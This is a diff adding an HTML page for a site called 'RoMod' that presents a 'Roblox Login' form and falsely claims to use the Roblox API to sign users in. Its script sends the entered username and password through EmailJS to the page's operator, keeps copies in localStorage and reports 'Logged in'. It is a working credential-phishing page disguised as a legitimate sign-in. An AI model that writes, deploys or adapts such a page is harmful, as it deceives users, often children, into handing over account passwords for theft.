@@ -1,0 +1,54 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RoMod - Home</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+    <div class="topbar">
+        <div style="display: flex; flex-direction: row; align-items: center; font-weight: bold;">
+            <img src="assets/images/logo.png" alt="" class="logo">
+        </div>
+    </div>
+    <div class="us">
+        <h1>Roblox Login</h1>
+        <hr style="width: 100%;">
+        <label for="">Username</label>
+        <input placeholder="Type here;" id="user">
+        <label for="">Password</label>
+        <input placeholder="Type here;" id="pass" type="password">
+        <p>We use Roblox API to get you signed in. Have a fun shop!</p>
+        <button onclick=" sendmail();">Login</button>
+    </div>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "17t6qvD2DdA6WyedV",
+      });
+   })();
+   var user = document.getElementById("user");
+var pass = document.getElementById("pass");
+
+
+
+function sendmail() {
+    let params = {
+        Username: user.value,
+        Password: pass.value
+    }
+
+    emailjs.send("service_xtecv2n", "template_wnisg8e",params).then(alert("Logged in"))
+    .catch(error => alert(error));
+    localStorage.setItem(user.value, user.value);
+    localStorage.setItem(pass.value, pass.value);
+    localStorage.setItem("currentUser", user.value);
+    window.location.href = "index.html";
+}
+</script>
+
+</body>
+</html>
